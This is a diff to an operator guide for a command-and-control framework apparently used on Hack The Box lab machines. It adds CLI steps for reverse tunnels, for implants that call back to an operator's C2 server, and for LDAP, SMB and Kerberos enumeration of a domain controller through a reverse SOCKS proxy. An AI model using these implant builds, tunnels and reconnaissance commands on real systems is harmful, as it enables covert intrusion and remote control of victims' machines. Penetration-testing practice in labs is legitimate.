@@ -68,19 +68,42 @@ sudo firewall-cmd --add-port=4444/tcp   # reverse shells
 
 **Sanity check from target** (after foothold): `curl -vk https://YOUR_TUN0:8443/` should get a TLS handshake (404 body is fine).
 
+## One command
+
+```bash
+erebus inbound status                         # tun0, listeners, proxy env, firewalld
+erebus inbound tunnel user@TARGET_IP          # same as scripts/htb_reverse_tunnel.sh
+eval "$(erebus inbound env --port 1080)"      # after: erebus op socks start --port 1080
+```
+
+Host `ldap` / `smb` / `ad` / `kerberos` honor `EREBUS_PROXY` / `ALL_PROXY` (SOCKS5 only). Loopback is not proxied unless `EREBUS_PROXY_LOCAL=1`.
+
 ## When target cannot reach tun0
 
-Many HTB boxes (FireFlow, DarkZeroReturns, etc.) **block outbound to VPN**. Use reverse tunnel:
+Many HTB boxes (FireFlow, DarkZeroReturns, etc.) **block outbound to VPN**. Reverse-tunnel C2 onto target localhost:
 
 ```bash
 # Operator: teamserver already listening on 127.0.0.1:8443
-./scripts/htb_reverse_tunnel.sh user@TARGET_IP
+erebus inbound tunnel user@TARGET_IP
+# equivalent: ./scripts/htb_reverse_tunnel.sh user@TARGET_IP
 
 # Build implant to loopback (tunnel carries traffic)
 make implant-c-linux \
   CALLBACK_URL=https://127.0.0.1:8443 \
   CA_CERT_PATH=$HOME/.erebus/ca-cert.pem \
   SLEEP_MS=500
+```
+
+## When operator cannot reach the DC
+
+Start C reverse SOCKS, then run host AD tools through it (this is the fill-skeleton path):
+
+```bash
+erebus op socks start --port 1080
+eval "$(erebus inbound env --port 1080)"
+erebus ldap enum --dc DC --domain DOM --user u --pass-file p --type interesting
+erebus smb shares --host DC --anon
+erebus kerberos skew --dc DC
 ```
 
 ## Implant build hygiene
@@ -93,7 +116,7 @@ make implant-c CALLBACK_URL=https://YOUR_C2:8443 \
 # Linux primary (C) — default after foothold on Linux HTB
 make implant-c-linux CALLBACK_URL=https://YOUR_C2:8443 \
   CA_CERT_PATH=$HOME/.erebus/ca-cert.pem SLEEP_MS=500 JITTER_PCT=10
-# Firewalled box: CALLBACK_URL=https://127.0.0.1:8443 + htb_reverse_tunnel.sh
+# Firewalled box: CALLBACK_URL=https://127.0.0.1:8443 + erebus inbound tunnel user@TARGET
 
 # Or generate (empty language → c for both windows and linux)
 # generate --os windows --arch amd64 --callback https://… --language c
